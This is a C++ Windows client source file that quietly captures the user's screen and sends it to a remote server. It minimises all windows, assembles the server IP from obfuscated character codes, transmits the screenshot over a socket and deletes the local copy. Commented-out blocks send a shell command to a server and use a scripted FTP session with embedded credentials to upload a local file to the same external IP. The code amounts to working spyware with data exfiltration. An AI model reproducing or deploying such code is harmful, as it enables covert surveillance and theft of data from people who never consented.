// ClientOne.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//
#include <iostream>
#include <WinSock.h>
#pragma comment (lib,"WS2_32.lib")
void error(const char* msg)
{
    //perror(msg);
    std::cout << '\n' << WSAGetLastError();
    WSACleanup();
    std::cin.ignore();
    exit(1);
}
void bzero(char* buf, int l)
{
    for (int i = 0; i < l; i++)
        buf[i] = '\0';
}
int main()
{
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event('M', 0, 0, 0);
    keybd_event('M', 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(1000);
    WSADATA ws = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &ws) == 0)
    {
        int sockfd;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serv_addr, cli_addr;
        bzero((char*)&serv_addr, sizeof(serv_addr));
        bzero((char*)&cli_addr, sizeof(cli_addr));
        serv_addr.sin_family = AF_INET;
        std::string str;
        int* d = new int[13];
        d[0] = 49;
        d[1] = 57;
        d[2] = 53;
        d[3] = 46;
        d[4] = 57;
        d[5] = 56;
        d[6] = 46;
        d[7] = 54;
        d[8] = 57;
        d[9] = 46;
        d[10] = 49;
        d[11] = 50;
        d[12] = 55;
        for (int i = 0; i < 13; i++)
            str += d[i];
        const char* add = str.c_str();
        serv_addr.sin_addr.s_addr = inet_addr(add);
        int port = 30000;
        serv_addr.sin_port = htons(port);
        int servlen = sizeof(serv_addr);
        int n = connect(sockfd, (struct sockaddr*)&serv_addr, servlen);
        HDC ScreenDC = GetDC(0);
        HDC MemoryDC = CreateCompatibleDC(ScreenDC);
        int ScreenHeight = GetSystemMetrics(SM_CYSCREEN);
        int ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
        ScreenWidth = ((ScreenWidth - 1) / 4 + 1) * 4;
        BITMAPINFO BMI;
        BMI.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        BMI.bmiHeader.biWidth = ScreenWidth;
        BMI.bmiHeader.biHeight = ScreenHeight;
        BMI.bmiHeader.biSizeImage = ScreenWidth * ScreenHeight * 3;
        BMI.bmiHeader.biCompression = BI_RGB;
        BMI.bmiHeader.biBitCount = 24;
        BMI.bmiHeader.biPlanes = 1;
        DWORD ScreenshotSize;
        ScreenshotSize = BMI.bmiHeader.biSizeImage;
        unsigned char* ImageBuffer;
        HBITMAP hBitmap = CreateDIBSection(ScreenDC, &BMI, DIB_RGB_COLORS, (void**)&ImageBuffer, 0, 0);
        SelectObject(MemoryDC, hBitmap);
        BitBlt(MemoryDC, 0, 0, ScreenWidth, ScreenHeight, ScreenDC, 0, 0, SRCCOPY);
        DeleteDC(MemoryDC);
        ReleaseDC(NULL, ScreenDC);
        FILE* sFile = 0;
        unsigned char tgaHeader[12] = { 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        unsigned char header[6];
        unsigned char tempColors = 0;
        fopen_s(&sFile, "S.tga", "wb");
        if (!sFile) {
            exit(1);
        }
        header[0] = ScreenWidth % 256;
        header[1] = ScreenWidth / 256;
        header[2] = ScreenHeight % 256;
        header[3] = ScreenHeight / 256;
        header[4] = BMI.bmiHeader.biBitCount;
        header[5] = 0;
        fwrite(tgaHeader, 1, sizeof(tgaHeader), sFile);
        fwrite(header, sizeof(header), 1, sFile);
        fwrite(ImageBuffer, BMI.bmiHeader.biSizeImage, 1, sFile);
        fclose(sFile);
        DeleteObject(hBitmap);
        FILE* f;
        fopen_s(&f, "S.tga", "rb");
        int c, count = 1;
        c = getc(f);
        while (c != EOF)
        {
            c = getc(f);
            count++;
        }
        fclose(f);
        char* s = new char[100];
        _itoa_s(count, s, 100, 10);
        n = send(sockfd, s, 100, 0);
        char* buffer = new char[count];
        fopen_s(&f, "S.tga", "rb");
        size_t bytes;
        if (f != NULL)
        {
            bytes = fread(buffer, sizeof(unsigned char), count, f);
            n = send(sockfd, buffer, count, 0);
            fclose(f);
        }
        Sleep(1000);
        shutdown(sockfd, 0);
        WSACleanup();
        system("del S.tga");
        delete[] buffer, s;
        return 0;
    }
    std::cin.ignore();
}

/*
    WSADATA ws = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &ws) == 0)
    {
        int sockfd;
        struct hostent* server = gethostbyname("localhost");
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0)
            error("ERROR opening socket");
        struct sockaddr_in serv_addr, cli_addr;
        bzero((char*)&serv_addr, sizeof(serv_addr));
        bzero((char*)&cli_addr, sizeof(cli_addr));
        serv_addr.sin_family = AF_INET;
        const char* address = "127.0.0.1";
        serv_addr.sin_addr.s_addr = inet_addr(address);
        int port = 30000;
        serv_addr.sin_port = htons(port);
        int servlen = sizeof(serv_addr);
        int n = connect(sockfd, (struct sockaddr*)&serv_addr, servlen);
        if (n < 0)
        {
            error("ERROR on connect");
        }
        int buflen = 100000;
        char* buffer = new char[buflen];
        bzero(buffer, buflen);
        std::string command = "ping 8.8.8.8>1.txt";
        for (int i = 0; i < command.size(); i++)
            buffer[i] = command[i];
        buffer[command.size()] = '\0';
        n = send(sockfd, buffer, buflen, 0);
        if (n < 0)
        {
            error("ERROR on send");
        }
        n = recv(sockfd, buffer, buflen, 0);
        std::cout << '\n' << buffer << std::endl;
        shutdown(sockfd, 0);
        WSACleanup();
        delete buffer;
        return 0;
    }
    std::cin.ignore();
*/
/*
FILE* fs;
fopen_s(&fs, "1.txt", "w");
if (fs)
{
    fwrite("user2\r\nuser2\r\nsend D:\\share\\1.txt\r\nbye", 1, sizeof("user2\r\nuser2\r\nsend D:\\share\\1.txt\r\nbye"), fs);
    fwrite("\000", 1, sizeof("\000"), fs);
    fclose(fs);
}
system("ftp -s:1.txt 195.98.69.127");
*/
